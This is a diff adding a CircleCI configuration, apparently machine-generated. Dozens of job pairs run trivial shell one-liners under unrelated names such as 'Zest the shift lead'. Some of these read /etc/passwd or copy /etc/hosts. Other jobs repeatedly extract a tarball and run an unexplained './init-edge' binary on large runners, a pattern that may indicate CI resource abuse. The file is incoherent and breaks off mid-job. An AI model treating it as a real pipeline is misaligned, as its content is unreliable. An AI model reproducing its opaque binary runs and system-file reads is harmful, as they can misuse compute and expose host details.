@@ -1,0 +1,1383 @@
+version: 2.1
+
+jobs:
+  y7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute 2
+          command: |
+            mkdir -p /tmp/recorder
+            set +o pipefail 2>/dev/null; head -c 962513 /dev/urandom | base32 > /tmp/recorder/v; true
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'v'
+  push-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/v > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  text-honey:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Then sort the report PDFs
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; find /opt -maxdepth 3 -type l -name \* -size +100k -mtime -365 -links +1 -exec ls -ld {} + 2>/dev/null | tail -10; true ; } > /tmp/recorder/VID62801
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'VID62801'
+  node20-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/1paytobrgg7r > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  iter7491:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Train the sampler for luck
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; function say { echo "[$(date +%T)] $*"; }; say 'running low on memory'; true ; } > /tmp/recorder/lmEr9iRe1
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'lmEr9iRe1'
+  add-dashboard-reload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/lmEr9iRe1 > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  o-form:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Zest the shift lead
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; grep -io sh /etc/shells | wc -l; true ; } > /tmp/recorder/1paytobrgg7r
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - '1paytobrgg7r'
+  ValidateRelease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/1paytobrgg7r > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  unsafeNo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Finally announce the affected users
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; awk -F : '{print $1, $3, $4}' /etc/passwd | wc -l; true ; } > /tmp/recorder/crc_e63b5a
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'crc_e63b5a'
+  gating:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/1paytobrgg7r > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  prod_val:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Also rebuild the config map
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; ls --all -cXt --quote-name --sort=extension /var/log | head -n 4; true ; } > /tmp/recorder/CASE-2022-00252
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'CASE-2022-00252'
+  Package_Tests7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/CASE-2022-00252 > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  OQ:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: split OMG
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; echo -n 'the quick brown fox jumps over the lazy dog' | od -An -tx1; true ; } > /tmp/recorder/stage-9966464
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'stage-9966464'
+  alpha-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/stage-9966464 > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  logIterateCb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Deploy the attention cache int8
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; printf 'id,item,qty,price\n1,peach,16,49.43\n2,lemon,20,96.63\n3,orange,15,64.02\n4,fig,2,1.98\n' > "${TMPDIR:-/tmp}/pod.conf" && cut -d, -f2 "${TMPDIR:-/tmp}/pod.conf"; true ; } > /tmp/recorder/build-v4.13.7
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'build-v4.13.7'
+  rigel:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/1paytobrgg7r > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  iris-dev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Only if the outbound orders are slow
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/warning_2020-09"/{cherry,banana,melon} && ls "/tmp/warning_2020-09"; true ; } > /tmp/recorder/105.137.198.160
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - '105.137.198.160'
+  verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/105.137.198.160 > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  VECX:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: env var rebuild pass
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; ls -on /usr/local/bin /bin | awk '{s+=$5} END {print s}'; true ; } > /tmp/recorder/GPU-velvet
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'GPU-velvet'
+  build-quick-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/GPU-velvet > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  wasBack:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Sleep 250 min
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; tr ':' ' ' </etc/passwd | head -n 2 | tr '[:lower:]' '[:upper:]'; true ; } > /tmp/recorder/Ha7MqbQZOqidnrztDw6s7l
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'Ha7MqbQZOqidnrztDw6s7l'
+  STAGE_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/1paytobrgg7r > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  rbMap_28:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Two minute warning deletion
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; echo 'dublin manila delhi vienna' | awk '{for(i=NF;i>0;i--) printf "%s ", $i; print ""}'; true ; } > /tmp/recorder/audit_20260814
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'audit_20260814'
+  LAB_VERIFY_3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/audit_20260814 > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  clanSize7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute 2
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; gzip -c /etc/hosts > "/dev/shm/node_1211.gz" && gzip -t "/dev/shm/node_1211.gz" && echo valid; true ; } > /tmp/recorder/VID_67452
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'VID_67452'
+  fx-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/VID_67452 > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  yamadaf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Toss the temp files
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; command ls -1 /etc; true ; } > /tmp/recorder/ArchiveEmber
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'ArchiveEmber'
+  ensure-quick-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/ArchiveEmber > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  ginagina:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Playtest v14 Beta
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; grep ID /etc/os-release | head -n 4 | tr -d '"'; true ; } > /tmp/recorder/MD5fen
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'MD5fen'
+  check-quick-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/1paytobrgg7r > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  relayCallbacks:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Only once the gateway is done
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; echo 'name: demo' | sha256sum | cut -c1-16; true ; } > /tmp/recorder/wavecoastal
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'wavecoastal'
+  whiskey:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/1paytobrgg7r > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  allBits:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Would you mind summarizing the press kit
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; echo "review pull request" && echo "changes saved"; true ; } > /tmp/recorder/packet-RPC-dev-Maple
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'packet-RPC-dev-Maple'
+  LAB_STAGE_7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/packet-RPC-dev-Maple > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  primarybody:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Chorus render
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; ls -Qs --width=72 /usr/lib | tr '\n' ' '; true ; } > /tmp/recorder/shimmerbosonstackred
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'shimmerbosonstackred'
+  uniform:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/1paytobrgg7r > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  NNKV-3266:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Do we need to bake the crafting recipes
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; awk -F : '{ print $1, $7 }' /etc/passwd | tac; true ; } > /tmp/recorder/molten.fen.asset.lepton
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'molten.fen.asset.lepton'
+  add-session:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/1paytobrgg7r > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  tel_rv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Scroll post release
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; ls -1 /|shuf -n 2; true ; } > /tmp/recorder/tmp-a5b23
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'tmp-a5b23'
+  DATA-72:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/tmp-a5b23 > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  Save-Decorator4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Repair by ops team
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; cat /etc/hosts >"/tmp/buffer.inventory02.list" 2>&1 && wc -l "/tmp/buffer.inventory02.list"; true ; } > /tmp/recorder/shader.amber.boson.crisp.render
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'shader.amber.boson.crisp.render'
+  chen-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/shader.amber.boson.crisp.render > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  upload63-uat:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review the open invoices for audit
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; printf '%s\n' "OK" | tr -d 'aeiou'; true ; } > /tmp/recorder/kxuOVqrxLcxCXMjrfxpvh
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'kxuOVqrxLcxCXMjrfxpvh'
+  VerifyPipeline:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/kxuOVqrxLcxCXMjrfxpvh > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  constName:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: gotta preload the health checks
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; cat /etc/profile | grep -i then | wc -l; true ; } > /tmp/recorder/105.120.10
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - '105.120.10'
+  t-old:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/1paytobrgg7r > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  TRL-COST-KEY:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Table swap
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; for w in thursday tuesday friday sunday wednesday monday; do echo "item: $w"; done; true ; } > /tmp/recorder/ci-env
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'ci-env'
+  anothr-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/ci-env > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  mark15:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute 2
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; mkdir -p "${TMPDIR:-/tmp}/coffee-chart-spam" && ls -ld "${TMPDIR:-/tmp}/coffee-chart-spam" && rmdir "${TMPDIR:-/tmp}/coffee-chart-spam"; true ; } > /tmp/recorder/build_30527
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'build_30527'
+  sep27-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/build_30527 > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  Articles:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
